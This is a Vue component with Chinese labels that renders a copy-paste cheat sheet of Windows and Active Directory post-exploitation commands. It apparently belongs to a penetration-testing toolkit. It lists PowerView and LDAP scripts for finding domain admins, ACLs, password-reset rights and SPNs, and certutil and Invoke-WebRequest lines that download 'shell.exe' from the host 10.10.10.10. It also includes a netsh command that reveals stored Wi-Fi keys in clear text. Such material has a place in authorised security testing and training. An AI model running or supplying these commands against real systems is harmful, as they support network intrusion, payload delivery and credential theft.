<template>
  <div class="space-y-4">
    <TabView :tabs="categories">
      <template #tab-0>
        <!-- 系统枚举 -->
        <div class="space-y-3">
          <div v-for="(item, idx) in systemEnum" :key="idx"
            class="reveal-item rounded-md border p-3"
            :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span v-if="item.title" class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.command }}</pre>
          </div>
        </div>
      </template>

      <template #tab-1>
        <!-- AD 枚举 -->
        <div class="space-y-3">
          <div class="rounded-md border p-3" style="border-color: var(--color-warning, #f59e0b); background-color: var(--color-bg-secondary);">
            <p class="text-xs font-medium" style="color: var(--color-warning, #f59e0b);">⚠ 需要 PowerView.ps1</p>
            <div class="flex items-center gap-2 mt-1">
              <code class="text-xs font-mono flex-1" style="color: var(--color-text);">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</code>
              <CopyButton text="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" />
            </div>
          </div>

          <div v-for="(item, idx) in adEnum" :key="idx"
            class="reveal-item rounded-md border p-3"
            :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.command }}</pre>
          </div>
        </div>
      </template>

      <template #tab-2>
        <!-- AD 脚本 -->
        <div class="space-y-3">
          <div v-for="(item, idx) in adScripts" :key="idx"
            class="reveal-item rounded-md border p-3"
            :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all; max-height: 300px;">{{ item.command }}</pre>
          </div>
        </div>
      </template>

      <template #tab-3>
        <!-- 下载 & WLAN -->
        <div class="space-y-3">
          <h4 class="text-sm font-medium" style="color: var(--color-text);">HTTP 下载</h4>
          <div v-for="(item, idx) in downloadCommands" :key="'dl-'+idx"
            class="reveal-item rounded-md border p-3"
            :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span v-if="item.title" class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.command }}</pre>
          </div>

          <h4 class="text-sm font-medium mt-4" style="color: var(--color-text);">WLAN 凭证</h4>
          <div v-for="(item, idx) in wlanCommands" :key="'wlan-'+idx"
            class="reveal-item flex items-center justify-between gap-2 rounded-md border px-3 py-2"
            :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
          >
            <code class="text-xs font-mono flex-1" style="color: var(--color-text);">{{ item }}</code>
            <CopyButton :text="item" />
          </div>
        </div>
      </template>
    </TabView>
  </div>
</template>

<script setup lang="ts">
import TabView from '../../common/TabView.vue';
import CopyButton from '../../common/CopyButton.vue';

const categories = ['系统枚举', 'AD 枚举', 'AD 脚本', '下载 & WLAN'];

const systemEnum = [
  { title: '系统信息', command: 'systeminfo' },
  { title: '计算机系统', command: 'Get-WmiObject Win32_ComputerSystem' },
  { title: '计算机域名', command: 'echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"' },
  { title: '安全补丁列表', command: 'Get-Hotfix -description "Security update"' },
  { title: '安全补丁 (WMIC)', command: 'wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn' },
  { title: '环境变量', command: 'Get-ChildItem Env: | ft Key,Value' },
  { title: '环境变量 (CMD)', command: 'set' },
];

const adEnum = [
  { title: '获取域名', command: 'Get-NetDomain' },
  { title: '获取林域', command: 'Get-NetForestDomain' },
  { title: '域 SID', command: 'Get-DomainSID' },
  { title: '域策略', command: 'Get-DomainPolicy' },
  { title: '域 OU', command: 'Get-NetOU' },
  { title: '域信任关系', command: 'Get-NetDomainTrust' },
  { title: 'GPO 枚举', command: 'Get-NetGPO -ComputerName computername.domain.com' },
  { title: '最后密码设置时间', command: 'Get-UserProperty -Properties pwdlastset' },
  { title: '用户描述字段搜索', command: 'Find-UserField -SearchField Description -SearchTerm "pass"' },
  { title: '域内计算机', command: 'Get-NetComputer' },
  { title: '可 Ping 的主机', command: 'Get-NetComputer -Ping' },
  { title: 'Win7 主机', command: 'Get-NetComputer -OperatingSystem "Windows 7 Ultimate"' },
  { title: '域管组成员', command: 'Get-NetGroupMember -GroupName "Domain Admins"' },
  { title: '管理员组', command: 'Get-NetGroup *admin*' },
  { title: '本地管理员', command: 'Get-NetLocalGroup -ComputerName PCNAME-001' },
  { title: '用户组关系', command: 'Get-NetGroup -UserName "username"' },
  { title: '用户 ACL', command: 'Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs' },
  { title: 'GPO 修改权限', command: 'Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}' },
  { title: '密码重置权限', command: 'Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"' },
  { title: 'LDIFDE 导出', command: 'ldifde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.ldf' },
  { title: 'CSVDE 导出', command: 'csvde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.csv' },
];

const adScripts = [
  {
    title: '枚举域用户',
    command: `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  Foreach($prop in $obj.Properties)
  {
    $prop
  }
  Write-Host "------------------------"
}`,
  },
  {
    title: '枚举域组',
    command: `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  $obj.Properties.name
}`,
  },
  {
    title: '枚举组成员',
    command: `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Secret_Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  $obj.Properties.member
}`,
  },
  {
    title: '检测 SPN',
    command: `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  Foreach($prop in $obj.Properties)
  {
    $prop
  }
}`,
  },
];

const downloadCommands = [
  { title: 'Invoke-WebRequest', command: 'Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe"' },
  { title: 'IWR (别名)', command: 'iwr -Uri "http://10.10.10.10/shell.exe" -OutFile "shell.exe"' },
  { title: 'Certutil 下载', command: 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe' },
];

const wlanCommands = [
  'netsh wlan show profiles',
  'netsh wlan show profile name="PROFILE-NAME" key=clear',
];
</script>
